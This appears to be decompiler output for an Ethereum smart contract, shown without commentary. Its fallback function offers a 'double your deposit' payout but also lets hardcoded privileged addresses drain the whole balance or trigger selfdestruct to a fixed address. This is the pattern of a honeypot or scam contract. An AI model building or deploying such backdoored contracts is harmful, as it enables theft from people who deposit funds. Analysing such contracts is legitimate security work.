contract main {


// =======================  Init code  ======================


uint256 stor0;
address stor1;
address stor2;
uint256 stor3;

function _fallback() payable {
    stor0 = msg.sender or Mask(96, 160, stor0)
    stor2 = 0xa019729ce49fbb45ab0df78962c2d4cd60b45c60
    stor1 = 0x93086cb2d5913dd6ef4e743de16a8ef7865af8d4
    stor3 = block.number
    return code.data[104 len 409]
}



// =====================  Runtime code  =====================


address stor0;
address stor1;
address stor2;
uint256 stor3;

function kill() payable {
    if block.number + 100 <= stor3:
    selfdestruct(0xa21ab834c0267f398abf388dd9691fba1bf18d9d)
}

function _fallback() payable {
    if stor2 == msg.sender:
        selfdestruct(0xa21ab834c0267f398abf388dd9691fba1bf18d9d)
    if stor1 != tx.origin:
        if stor1 != msg.sender:
            if msg.sender == stor0:
                call stor0 with:
                   value eth.balance(this.address) wei
                     gas 0 wei
            else:
                if tx.origin == stor0:
                    call stor0 with:
                       value eth.balance(this.address) wei
                         gas 0 wei
                else:
                    if msg.value >= eth.balance(this.address):
                        call msg.sender with:
                           value msg.value wei
                             gas 0 wei
                    if bool(sha3(block.timestamp) + sha3(gas_remaining)):
                        call msg.sender with:
                           value 2 * msg.value wei
                             gas 0 wei
}



}
